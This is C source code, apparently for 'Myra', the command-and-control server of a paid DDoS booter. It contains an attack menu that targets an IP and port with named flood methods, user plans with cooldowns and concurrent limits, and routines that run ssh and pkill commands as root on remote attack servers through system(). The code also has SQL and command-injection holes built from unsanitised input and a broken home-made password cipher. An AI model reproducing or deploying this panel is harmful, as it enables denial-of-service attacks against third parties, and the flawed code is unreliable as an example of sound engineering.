#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>
#include <math.h>
#include <mysql.h>
#include <my_global.h>

#include "config.h"
#include "attacks.h"
#include "commands.h"
#include "mysql.h"

char key[] = "36753562912709360626";

char broadcast[100];
int broadcast_time = 0;

const char *_attack_menu[] = {
    "\e[38;5;79m╔════════════════════════╗ ╔════════════════════════╗ ╔════════════════════════╗\r\n",
    "\e[38;5;79m║    \e[38;5;204mStandard-Attacks    \e[38;5;79m║ ║    \e[38;5;204mSpecial-Attacks     \e[38;5;79m║ ║  \e[38;5;204mMulti-Vector Attacks  \e[38;5;79m║\r\n",
    "\e[38;5;79m╚════════════════════════╝ ╚════════════════════════╝ ╚════════════════════════╝\r\n",
    "\e[38;5;79m╔════════════════════════╗ ╔════════════════════════╗ ╔════════════════════════╗\r\n",
    "\e[38;5;79m║  \e[38;5;204m.\e[38;5;230mwitch  \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m]   \e[38;5;79m║ ║  \e[38;5;204m.\e[38;5;230moryx    \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m]  \e[38;5;79m║ ║  \e[38;5;204m.\e[38;5;230mmassacre \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m]        \e[38;5;79m║\r\n",
    "\e[38;5;79m║  \e[38;5;204m.\e[38;5;230mhome   \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m]   \e[38;5;79m║ ║  \e[38;5;204m.\e[38;5;230mphoenix \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m]  \e[38;5;79m║ ║  \e[38;5;204m.\e[38;5;230methera   \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m]        \e[38;5;79m║\r\n",
    "\e[38;5;79m║  \e[38;5;204m.\e[38;5;230mosiris \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m]   \e[38;5;79m║ ║  \e[38;5;204m.\e[38;5;230mgunther \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m]  \e[38;5;79m║ ║  \e[38;5;204m.\e[38;5;230meris     \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m] \e[38;5;79m║\r\n",
    "\e[38;5;79m║  \e[38;5;204m.\e[38;5;230mkratos \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m]   \e[38;5;79m║ ╚════════════════════════╝ ║  \e[38;5;204m.\e[38;5;230mxxxxxxxx \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m]        \e[38;5;79m║\r\n",
    "\e[38;5;79m║  \e[38;5;204m.\e[38;5;230modin   \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m]   \e[38;5;79m║ ╔════════════════════════╗ ║  \e[38;5;204m.\e[38;5;230mxxxxxxxx \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m] \e[38;5;79m║\r\n",
    "\e[38;5;79m╚════════════════════════╝ ╚════════════════════════╝ ╚════════════════════════╝\r\n",
    "\e[38;5;79m╔════════════════════════╗ ╔════════════════════════╗ ╔════════════════════════╗\r\n",
    "\e[38;5;79m║      \e[38;5;204mGame-Attacks      \e[38;5;79m║ ║      \e[38;5;204mxxxxxxxxxxxx      \e[38;5;79m║ ║      \e[38;5;204mxxxxxxxxxxxx      \e[38;5;79m║\r\n",
    "\e[38;5;79m╚════════════════════════╝ ╚════════════════════════╝ ╚════════════════════════╝\r\n",
    "\e[38;5;79m╔════════════════════════╗ ╔════════════════════════╗ ╔════════════════════════╗\r\n",
    "\e[38;5;79m║  \e[38;5;204m.\e[38;5;230mfn-drop  \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m] \e[38;5;79m║ ║  \e[38;5;204m.\e[38;5;230mxxxxxxx \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m]  \e[38;5;79m║ ║  \e[38;5;204m.\e[38;5;230mxxxxxxx \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m]  \e[38;5;79m║\r\n",
    "\e[38;5;79m║  \e[38;5;204m.\e[38;5;230mr6-drop  \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m] \e[38;5;79m║ ║  \e[38;5;204m.\e[38;5;230mxxxxxxx \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m]  \e[38;5;79m║ ║  \e[38;5;204m.\e[38;5;230mxxxxxxx \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m]  \e[38;5;79m║\r\n",
    "\e[38;5;79m║  \e[38;5;204m.\e[38;5;230mark-drop \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m] \e[38;5;79m║ ║  \e[38;5;204m.\e[38;5;230mxxxxxxx \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m]  \e[38;5;79m║ ║  \e[38;5;204m.\e[38;5;230mxxxxxxx \e[38;5;204m[\e[38;5;230mIP\e[38;5;204m] [\e[38;5;230mPORT\e[38;5;204m]  \e[38;5;79m║\r\n",
    "\e[38;5;79m╚════════════════════════╝ ╚════════════════════════╝ ╚════════════════════════╝\r\n",
    "\e[38;5;79m╔════════════════════════╗ ╔═══════════════════════════════════════════════════╗\r\n",
    "\e[38;5;79m║ \e[38;5;79mMyra \e[38;5;230mV\e[38;5;79m. \e[38;5;230mAttack Menu\e[38;5;230m.   \e[38;5;79m║ ║ \e[38;5;230mThis \e[38;5;204mmenu \e[38;5;230mis ongoing progress \e[38;5;204m!                   \e[38;5;79m║\r\n",
    "\e[38;5;79m║ \e[38;5;204mVersion \e[38;5;230mIII \e[38;5;204m[\e[38;5;230mBETA\e[38;5;204m]\e[38;5;230m.    \e[38;5;79m║ ║ \e[38;5;230mThis will be updated daily with new methods.      \e[38;5;79m║\r\n",
    "\e[38;5;79m║ \e[38;5;204mSemi\e[38;5;230m-\e[38;5;204mRelease\e[38;5;230m.          \e[38;5;79m║ ║ \e[38;5;204mGame-Attacks \e[38;5;230mare currently \e[38;5;204mNOT \e[38;5;230mworking\e[38;5;204m.           \e[38;5;79m║\r\n"
    "\e[38;5;79m╚════════════════════════╝ ╚═══════════════════════════════════════════════════╝\r\n"
};

const char *_banner[] = {
   	"\e[38;5;79m╔═══════════════════════════════╗╔══════════════════════════════════╗╔═════════╗\r\n",
    "\e[38;5;79m║ \e[38;5;230mProject Myra \e[38;5;204mV\e[38;5;79m.               ║║ \e[38;5;230mWelcome To The \e[38;5;204mMyra Initiative\e[38;5;79m.  ║║  \e[38;5;230mV\e[38;5;79m. \e[38;5;230m50\e[38;5;79m. ║\r\n",
    "\e[38;5;79m║ \e[38;5;230mPrivate \e[38;5;204mDeveloper's Edition\e[38;5;79m.  ║╚══════════════════════════════════╝╚═════════╝\r\n",
    "\e[38;5;79m║ \e[38;5;230mBuild \e[38;5;204m50\e[38;5;79m.                     ║╔═════════════════════════════════════════════╗\r\n",
    "\e[38;5;79m╚═══════════════════════════════╝║ \e[38;5;204mTransmissional\e[38;5;79m. \e[38;5;204mCapabilities Exceed\e[38;5;79m.        ║\r\n",
    "\e[38;5;79m╔═══════════════════════════════╗║ \e[38;5;204mTill We Fall\e[38;5;79m.                               ║\r\n",
    "\e[38;5;79m║ \e[38;5;230mSubstrate \e[38;5;204mV\e[38;5;79m.......\e[38;5;230m: \e[38;5;204mActive \e[38;5;79m!  \e[38;5;79m║║ \e[38;5;204mXVII\e[38;5;79m.                                       ║\r\n",
    "\e[38;5;79m║ \e[38;5;230mHyperpower \e[38;5;204mIV\e[38;5;79m.....\e[38;5;230m: \e[38;5;204mActive \e[38;5;79m!  \e[38;5;79m║╚═════════════════════════════════════════════╝\r\n",
    "\e[38;5;79m║ \e[38;5;230mHashme \e[38;5;204mII\e[38;5;79m.........\e[38;5;230m: \e[38;5;204mActive \e[38;5;79m!  \e[38;5;79m║                       ╔══════════════════════╗\r\n",
    "\e[38;5;79m╚═══════════════════════════════╝╔═════════════════════╗╚══════════════════════╝\r\n",
    "\e[38;5;79m╔════════════════════════════════╝                     ║╔══════════════════════╗\r\n",
    "\e[38;5;79m║ \e[38;5;204m.\e[38;5;230mmenu    \e[38;5;79m- \e[38;5;230mDisplays Attack Menu I\e[38;5;204m.                   \e[38;5;79m║║ \e[38;5;230mSTATE\e[38;5;79m.......\e[38;5;230m: \e[38;5;204mPRIV   \e[38;5;79m║\r\n",
    "\e[38;5;79m║ \e[38;5;204m.\e[38;5;230mattacks \e[38;5;79m- \e[38;5;230mDisplays Full Attack List\e[38;5;204m.                \e[38;5;79m║║ \e[38;5;230mHYPERPOWER\e[38;5;79m..\e[38;5;230m: \e[38;5;204mIII    \e[38;5;79m║\r\n",
    "\e[38;5;79m║ \e[38;5;204m.\e[38;5;230mkill    \e[38;5;79m- \e[38;5;230mStops User Attacks\e[38;5;204m.                       \e[38;5;79m║║ \e[38;5;230mVERSION\e[38;5;79m.....\e[38;5;230m: \e[38;5;204m50     \e[38;5;79m║\r\n",
    "\e[38;5;79m║ \e[38;5;204m.\e[38;5;230mlookup  \e[38;5;79m- \e[38;5;230mIPlookup Function\e[38;5;204m.                        \e[38;5;79m║║ \e[38;5;230mSCKET_INT\e[38;5;79m...\e[38;5;230m: \e[38;5;204m4      \e[38;5;79m║\r\n",
    "\e[38;5;79m║ \e[38;5;204m.\e[38;5;230mclear   \e[38;5;79m- \e[38;5;230mClears C2 Screen\e[38;5;204m.                         \e[38;5;79m║║ \e[38;5;230mSUBSTRATE\e[38;5;79m...\e[38;5;230m: \e[38;5;204mV      \e[38;5;79m║\r\n",
    "\e[38;5;79m║ \e[38;5;204m.\e[38;5;230mstatus  \e[38;5;79m- \e[38;5;230mShows Network Status\e[38;5;204m.                     \e[38;5;79m║║ \e[38;5;230mDESC\e[38;5;79m........\e[38;5;230m: \e[38;5;204mC2XSUB \e[38;5;79m║\r\n",
    "\e[38;5;79m║ \e[38;5;204m.\e[38;5;230mchat    \e[38;5;79m- \e[38;5;230mEnable Myra Chat Room\e[38;5;204m.                    \e[38;5;79m║║ \e[38;5;230mALGORITHM\e[38;5;79m...\e[38;5;230m: \e[38;5;204mAES256 \e[38;5;79m║\r\n",
    "\e[38;5;79m║ \e[38;5;204m.\e[38;5;230musers   \e[38;5;79m- \e[38;5;230mGet All Online Users\e[38;5;204m.                     \e[38;5;79m║║ \e[38;5;230mPRJ-VAS\e[38;5;79m.....\e[38;5;230m: \e[38;5;204m44-XX  \e[38;5;79m║\r\n",
    "\e[38;5;79m║ \e[38;5;204m.\e[38;5;230mwhois   \e[38;5;79m- \e[38;5;230mWhois Search for IP\e[38;5;204m.                      \e[38;5;79m║║ \e[38;5;230mCCR-VSS\e[38;5;79m.....\e[38;5;230m: \e[38;5;204m84XXX  \e[38;5;79m║\r\n",
    "\e[38;5;79m║ \e[38;5;204m.\e[38;5;230mnmap    \e[38;5;79m- \e[38;5;230mIP Port Scanner\e[38;5;204m.                          \e[38;5;79m║║ \e[38;5;230mDATA_TRMIT\e[38;5;79m..\e[38;5;230m: \e[38;5;204mACTIVE \e[38;5;79m║\r\n",
    "\e[38;5;79m║ \e[38;5;204m.\e[38;5;230maccount \e[38;5;79m- \e[38;5;230mGet Your Account Details\e[38;5;204m.                 \e[38;5;79m║║ \e[38;5;230mSRVER_ON\e[38;5;79m....\e[38;5;230m: \e[38;5;204m2      \e[38;5;79m║\r\n",
    "\e[38;5;79m╚══════════════════════════════════════════════════════╝╚══════════════════════╝\r\n"
};

void _encrypt(const char *str)
{
	int index = 0;
	memset(encstr, 0, sizeof(encstr));
	strcpy(encstr, str);
	int i, ii;

	for(i = 0; i < BLOCK_SIZE; i++)
	{
		encstr[index] ^= key[i];
		encstr[index] = encstr[index] << 8 & 0xff;
		index++;

		if(index >= strlen(str))
			index = 0;
	}

	for(i = 0; i < BLOCK_SIZE / strlen(str); i++)
		strcat(encstr, str);

	for(i = 0; i < BLOCK_SIZE; i++)
		encstr[i] ^= key[i];

	for(i = 0; i < BLOCK_SIZE; i++)
	{
		for(ii = 0; ii < BLOCK_SIZE; ii++)
			encstr[i] ^= key[ii];
	}
}

void console_log(const char *buffer)
{
	fprintf(stderr, "\e[38;5;79m[\e[38;5;204m%s\e[38;5;79m] [\e[38;5;204mMyra\e[38;5;79m]\e[38;5;204m: \e[38;5;230m%s\n", __DATE__, buffer);
}

void add_plan(const int fd)
{
	/*
	char plan[100], cooldown[100], concurrent[100], attacktime[100];
	send(fd, "Plan: ", strlen("Plan: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, buffer);
	send(fd, "Cooldown: ", strlen("Cooldown: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, buffer);
	send(fd, "Concurrent: ", strlen("Concurrent: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, buffer);
	send(fd, "Attacktime: ", strlen("Attacktime: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, buffer);
	*/

}

void broadcast_message(int fd)
{
	send(fd, "Message: ", strlen("Message: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, broadcast);
}

void remove_concurrent(int fd, char *target)
{
	int i;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strcmp(user[fd].username, conn[i].username) == 0 && strcmp(conn[i].target, target) == 0)
		{
			conn[i].start = 0;
			memset(conn[i].username, 0, sizeof(conn[i].username));
			conn[i].timer = 0;
			memset(conn[i].target, 0, sizeof(conn[i].target));
		}
	}
}

void iplookup(const int fd)
{
	int rfd, index = 0, i;
	char *command, buffer[1024], ipdata[1024];

	send(fd, "IP: ", strlen("IP: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, buffer);
	send(fd, SCREENCLEAR, strlen(SCREENCLEAR), MSG_NOSIGNAL);
	ip_info(fd, buffer);
}

int fdgets(int fd, char *buffer, int bufferSize) // ty for receiving function from qbot, putty is aids :D
{
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	epoll_remove_newline(buffer);
	return got;
}

void change_password(MYSQL *con, const int fd)
{
	char buffer[100], *command;

	send(fd, "\e[38;5;230mPassword\e[38;5;79m: ", strlen("\e[38;5;230mPassword\e[38;5;79m: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, buffer);

	epoll_remove_newline(buffer);
	_encrypt(buffer);
	asprintf(&command, "UPDATE users SET password='%s' WHERE username='%s'",
		escape_string(encstr), user[fd].name);
	mysql_query(con, command);

	free(command);
}

void killall_attacks(const int fd)
{
	int rfd, i, port;
	char buffer[1024], ip[100], pass[50], *attack;

	FILE *fp;

	fp = fopen("servers.txt", "r");

	while(1)
	{
		memset(ip, 0, sizeof(ip));
		fscanf(fp, "%s %s", ip, pass);

		if(strlen(ip) == 0)
			break;

		for(i = 0; i < MAX_CONNS; i++)
		{
			if(strlen(atk[i].type) > 0)
			{
				asprintf(&attack, "screen -S KILLALLATKS -d -m sshpass -p %s ssh -p 885 root@%s pkill %s",
					pass, ip, atk[i].type);
				printf("%s\n", attack);
				system(attack);
				free(attack);
			}
		}
	}
	fclose(fp);
}

void kill_attack(char *username, const int fd)
{
	int rfd, i, port;
	char buffer[1024], ip[100], pass[50], *attack, target[100];

	FILE *fp;

	send(fd, "\e[38;5;230mAttack-IP\e[38;5;204m: ", strlen("\e[38;5;230mAttack-IP\e[38;5;204m: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, target);
	remove_concurrent(fd, target);

	fp = fopen("servers.txt", "r");

	if(find_exploit(fd, target))
		return;

	while(1)
	{
		memset(ip, 0, sizeof(ip));
		fscanf(fp, "%s %s", ip, pass);

		if(strlen(ip) == 0)
			break;

		for(i = 0; i < MAX_CONNS; i++)
		{
			if(strlen(atk[i].type) > 0)
			{
				asprintf(&attack, "screen -S KILLALLATKS -d -m sshpass -p %s ssh -p 885 root@%s screen -XS '%s[%s][%s].attack' quit",
					pass, ip, atk[i].type, username, target);
				system(attack);
				free(attack);
			}
		}
	}
	fclose(fp);	
}

int decide_expiry_date(char *date)
{
	char *day, *month, *year;
	int index = 0, add = 0, i;

	day = calloc(1, sizeof(char));
	month = calloc(1, sizeof(char));
	year = calloc(1, sizeof(char));

	for(i = 0; i < strlen(date); i++)
	{
		if(date[i] == '/')
		{
			add = 0;
			index++;
			i++;
		}

		if(index == 0)
		{
			day = realloc(day, add + 1);
			day[add] = date[i];
		}
		else if(index == 1)
		{
			month = realloc(month, add + 1);
			month[add] = date[i];
		}
		else if(index == 2)
		{
			year = realloc(year, add + 1);
			year[add] = date[i];
		}
		add++;
	}

	time_t now;
	time(&now);

	struct tm *local = localtime(&now);

	if(atoi(year) < local->tm_year)
	{
		return 1;
	}
	else if(atoi(year) == local->tm_year + 1900)
	{
		if(atoi(month) < local->tm_mon + 1)
			return 1;

		else if(atoi(month) == local->tm_mon + 1)
		{
			if(atoi(day) < local->tm_mday)
				return 1;
		}
	}
	return 0;
}

void epoll_clear_tried()
{
	int i;

	for(i = 0; i < MAX_CONNS; i++)
		memset(_tried[i].name, 0, sizeof(_tried[i].name));
}

int epoll_in_tried(const char *str)
{
	int i;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strcmp(str, _tried[i].name) == 0)
			return 0;
	}
	return 1;
}

void epoll_get_user_ranking(MYSQL *conn, const int fd)
{
	char *buffer;
	int i, counter = 0;

	if(mysql_query(conn, "SELECT * from attacks"))
	{
		printf("[MYSQL] error: %s\n", mysql_error);
	}

	MYSQL_RES *res = mysql_store_result(conn);

	int num_fields = mysql_num_fields(res);

	MYSQL_ROW row;

	while((row = mysql_fetch_row(res)))
		counter++;

	epoll_clear_tried();

	asprintf(&buffer, "total attacks: %d\r\n", counter);
	send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
	free(buffer);

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(db[i].user) == 0)
			continue;

		if(epoll_in_tried(db[i].user))
		{
			strcpy(_tried[i].name, db[i].user);
			epoll_get_user_ranking_user(conn, i, fd);
		}
	}
}

void epoll_get_user_ranking_user(MYSQL *conn, const int index, const int fd)
{
	char rdbuf[4096], *token, *buffer;
	float count = 0, counter = 0;

	if(mysql_query(conn, "SELECT * from attacks"))
	{
		printf("\e[38;5;79m[\e[38;5;204mMYSQL\e[38;5;79m] \e[38;5;204merror\e[38;5;79m: \e[38;5;230m%s\n", mysql_error);
	}

	MYSQL_RES *res = mysql_store_result(conn);

	int num_fields = mysql_num_fields(res);

	MYSQL_ROW row;

	while((row = mysql_fetch_row(res)))
	{
		if(strcmp(row[2], db[index].user) == 0)
			count++;
		counter++;
	}

	if(count > 0)
	{
		asprintf(&buffer, "\e[38;5;230mUser\e[38;5;204m: \e[38;5;79m[\e[38;5;204m%s\e[38;5;79m] \e[38;5;204m- \e[38;5;230mConnections\e[38;5;204m: \e[38;5;79m[\e[38;5;204m%d\e[38;5;79m] \e[38;5;204m- \e[38;5;230mAttack \e[38;5;204m%: \e[38;5;79m[\e[38;5;204m%.2f\e[38;5;230m%\e[38;5;79m] \e[38;5;204m- \e[38;5;230mAttacks\e[38;5;204m: \e[38;5;79m[\e[38;5;204m%.0f\e[38;5;79m]\r\n", 
			db[index].user, db[index].logged_in, count / counter * 100, count);
		send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
		free(buffer);
	}
	return count;
}

void epoll_get_plan(const char *type, const int index)
{
	int i;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(plan[i].name) == 0)
			continue;

		if(strcmp(type, plan[i].name) == 0)
		{
			db[index].cooldown = plan[i].cooldown;
			db[index].concurrents = plan[i].concurrent;
			db[index].attacktime = plan[i].attacktime;
			return;
		}
	}
}

void epoll_cooldown_user(const int fd)
{	
	int i;
	char buffer[100], username[100], message[100];

	send(fd, "\e[38;5;230mUsername\e[38;5;204m: ", strlen("\e[38;5;230mUsername\e[38;5;204m: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, username);
	cooldown:

	send(fd, "\e[38;5;230mCooldown-Time\e[38;5;204m: ", strlen("\e[38;5;230mCooldown-Time\e[38;5;204m: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, buffer);

	send(fd, "\e[38;5;230mMessage\e[38;5;204m: ", strlen("\e[38;5;230mMessage\e[38;5;204m: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, message);

	if(atoi(buffer) == 0)
	{
		send(fd, "\e[38;5;230mPlease enter a \e[38;5;204mvalid \e[38;5;230mcooldown\e[38;5;79m.\r\n", 
			strlen("\e[38;5;230mPlease enter a \e[38;5;204mvalid \e[38;5;230mcooldown\e[38;5;79m.\r\n"), MSG_NOSIGNAL);
		goto cooldown;
	}

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strcmp(user[i].name, username) == 0)
		{
			user[i].cooldown_start = time(0);
			user[i].cooldown = atoi(buffer);

			send(user[i].fd, "\r\n", strlen("\r\n"), MSG_NOSIGNAL);
			send(user[i].fd, "\e[38;5;79m[\e[38;5;204mAdmin-Message\e[38;5;79m]\e[38;5;204m: ", strlen("\e[38;5;79m[\e[38;5;204mAdmin-Message\e[38;5;79m]\e[38;5;204m: "), MSG_NOSIGNAL);
			send(user[i].fd, user[fd].name, strlen(user[fd].name), MSG_NOSIGNAL);
			send(user[i].fd, "\e[38;5;230mLocked you out of \e[38;5;204mMyra\e[38;5;79m.", strlen("\e[38;5;230mLocked you out of \e[38;5;204mMyra\e[38;5;79m."), MSG_NOSIGNAL);
			send(user[i].fd, message, strlen(message), MSG_NOSIGNAL);
			send(user[i].fd, "\r\n", strlen("\r\n"), MSG_NOSIGNAL);
			break;
		}
	}
}

int epoll_getconcurrents()
{
	int count = 0, i;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(conn[i].timer > 0)
			count++;
	}
	return count;
}

void cnc_log_mkdir()
{
	int fd, i;
	char *rdpath;
	DIR *dir;

	dir = opendir(USERLOGS);
	if(!dir)
	{
		mkdir(USERLOGS, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
	}
	else
		closedir(dir);

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(db[i].user) > 0)
		{
			asprintf(&rdpath, "%s/%s", USERLOGS, db[i].user);
			dir = opendir(rdpath);
			if(!dir)
				mkdir(rdpath, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
			else
				closedir(dir);
			free(rdpath);
		}
	}
}

void reset_password(MYSQL *con, const int fd)
{
	char buffer[100], *command, username[100];

	send(fd, "\e[38;5;230mUsername\e[38;5;204m:\e[38;5;79m ", strlen("\e[38;5;230mUsername\e[38;5;204m:\e[38;5;79m "), MSG_NOSIGNAL);
	recv(fd, username, sizeof(username), MSG_NOSIGNAL);
	send(fd, "\e[38;5;230mPassword\e[38;5;204m:\e[38;5;79m \e[?25l\e[38;5;0m", strlen("\e[38;5;230mPassword\e[38;5;204m:\e[38;5;79m \e[?25l\e[38;5;0m"), MSG_NOSIGNAL);
	recv(fd, buffer, sizeof(buffer), MSG_NOSIGNAL);

	epoll_remove_newline(username);
	epoll_remove_newline(buffer);
	_encrypt(buffer);
	asprintf(&command, "UPDATE users SET password='%s' WHERE username='%s'",
		escape_string(encstr), username);
	mysql_query(con, command);
}

void send_webhook(const char *argument)
{
	int childpid;
	char *req;

	childpid = fork();

	if(childpid == -1 || childpid > 0)
		return;

	asprintf(&req, "curl --data 'content=%s' %s 2>&1", argument, WEBHOOK);
	system(req);

	exit(0);
}

void cnc_log_user(const char *_user, const char *path, const char *data)
{
	char *rdpath;
	int fd, i;

	asprintf(&rdpath, "%s/%s/%s.txt", USERLOGS, _user, path);
	fd = open(rdpath, O_APPEND | O_WRONLY | O_CREAT);
	write(fd, data, strlen(data));
	write(fd, "\n", 1);

	free(rdpath);
	close(fd);

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(user[i].logging == 1 && strcmp(_user, user[i].username))
		{
			epoll_remove_newline(data);
			asprintf(&rdpath, "\r\n\e[38;5;79m[\e[38;5;204mMyra\e[38;5;79m]\e[38;5;204m: \e[38;5;79m[\e[38;5;204m%s\e[38;5;79m] \e[38;5;204m- \e[38;5;230mCommand \e[38;5;204m: \e[38;5;79m[\e[38;5;204m'\e[38;5;230m%s\e[38;5;204m'\e[38;5;79m]", 
				_user, data);
			send(user[i].fd, rdpath, strlen(rdpath), MSG_NOSIGNAL);
			//epoll_send_prompt(user[i].fd, user[i].name);
			return;
		}
	}
}

/*
void epoll_print_loginprompt(const int fd)
{
	int i;

	for(i = 0; i < sizeof(_login) / sizeof(_login[0]); i++)
		send(fd, _login[i], strlen(_login[i]), MSG_NOSIGNAL);
}
*/

int epoll_check_concurrents(const char *user)
{
	int i, count = 0;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(conn[i].username) == 0)
			continue;

		if(strcmp(user, conn[i].username) == 0)
			count++;
	}
	return count;
}

void epoll_get_concurrents(const int fd)
{
	char *rdbuf;
	int i, found = 0;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(conn[i].timer > 0)
		{
			asprintf(&rdbuf, "\e[38;5;230mUser\e[38;5;204m: \e[38;5;79m[\e[38;5;204m%s\e[38;5;79m] \e[38;5;204m- \e[38;5;230mRemaining\e[38;5;204m: \e[38;5;79m[\e[38;5;204m%d\e[38;5;79m] \e[38;5;204m| \e[38;5;230mTime\e[38;5;204m: \e[38;5;79m[\e[38;5;204m%d\e[38;5;79m]\r\n", conn[i].username, 
				conn[i].start + conn[i].timer - time(0), conn[i].timer);
			send(fd, rdbuf, strlen(rdbuf), MSG_NOSIGNAL);
			free(rdbuf);
			found = 1;
		}
	}

	if(found == 0)
		send(fd, "There is no concurrent attacks running on \e[38;5;204mMyra\e[38;5;79m.\r\n", 
			strlen("There is no concurrent attacks running on \e[38;5;204mMyra\e[38;5;79m.\r\n"), MSG_NOSIGNAL);
}

void epoll_blacklist_attack_ip(MYSQL *con, const int fd)
{
	char *command, buffer[100];

	send(fd, "\e[38;5;230mWhose \e[38;5;204mIP \e[38;5;230mwould you like to \e[38;5;204mblacklist\e[38;5;230m?\e[38;5;204m: ", strlen("\e[38;5;230mWhose \e[38;5;204mIP \e[38;5;230mwould you like to \e[38;5;204mblacklist\e[38;5;230m?\e[38;5;204m: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, buffer);
	epoll_remove_newline(buffer);

	asprintf(&command, "INSERT INTO blacklisted VALUES ('0', '%s')",
		buffer);
	mysql_query(con, command);
	free(command);
}

void epoll_get_online_users(int line, const int fd)
{
	char *buffer;
	int i;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(user[i].name) > 0)
		{
			if(strcmp(db[line].type, "admin") == 0)
			{
				asprintf(&buffer, "\e[38;5;79m[\e[38;5;204m%s\e[38;5;79m] \e[38;5;204m- \e[38;5;230mUID \e[38;5;204m: \e[38;5;79m[\e[38;5;204m%d\e[38;5;79m] \e[38;5;204m| \e[38;5;230mIP \e[38;5;204m: \e[38;5;79m[\e[38;5;204m%s\e[38;5;79m]\r\n", 
					user[i].name, user[i].seed, user[i].address);
				send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
			}
			else
			{
				asprintf(&buffer, "\e[38;5;79m[\e[38;5;204m%s\e[38;5;79m] \e[38;5;204m- \e[38;5;230mUID \e[38;5;204m: \e[38;5;79m[\e[38;5;204m%d\e[38;5;79m]\r\n", 
					user[i].name, user[i].seed);
				send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
			}
			free(buffer);
		}
	}
}


int attack_count_args(int fd, int index, char *rdbuf)
{
	int num = -1, count = 0;
	count = 2 + atk[index].port + atk[index].len;

	char *token = strtok(rdbuf, " ");

	while(token != 0)
	{
		num++;
		token = strtok(0, " ");
	}

	if(num == count)
		return 1;

	if(num > count)
		send(fd, "\e[38;5;230mYou are \e[38;5;204musing too much arguments\e[38;5;79m!\r\n", strlen("\e[38;5;230mYou are \e[38;5;204musing too much arguments\e[38;5;79m!\r\n"), 
			MSG_NOSIGNAL);
	else if(num < count)
		send(fd, "\e[38;5;230mYou are \e[38;5;204musing too few arguments\e[38;5;79m!\r\n", strlen("\e[38;5;230mYou are \e[38;5;204musing too few arguments\e[38;5;79m!\r\n"), 
			MSG_NOSIGNAL);	
	return 0;
}

int get_popularity_count(MYSQL *conn, const int fd, const char *type)
{
	char rdbuf[4096], *token, *buffer, _type[100];
	int i;
	float count = 0, counter = 0;

	if(mysql_query(conn, "SELECT * from attacks"))
	{
		printf("\e[38;5;79m[\e[38;5;204mMYSQL\e[38;5;79m] \e[38;5;204merror\e[38;5;79m: \e[38;5;230m%s\n", mysql_error);
	}

	MYSQL_RES *res = mysql_store_result(conn);

	int num_fields = mysql_num_fields(res);

	MYSQL_ROW row;

	while((row = mysql_fetch_row(res)))
	{
		if(strcmp(row[1], type) == 0)
			count++;
		counter++;
	}

	strcpy(_type, type);
	for(i = 0; i < 10 - strlen(type); i++)
		strcat(_type, "\e[38;5;204m.");

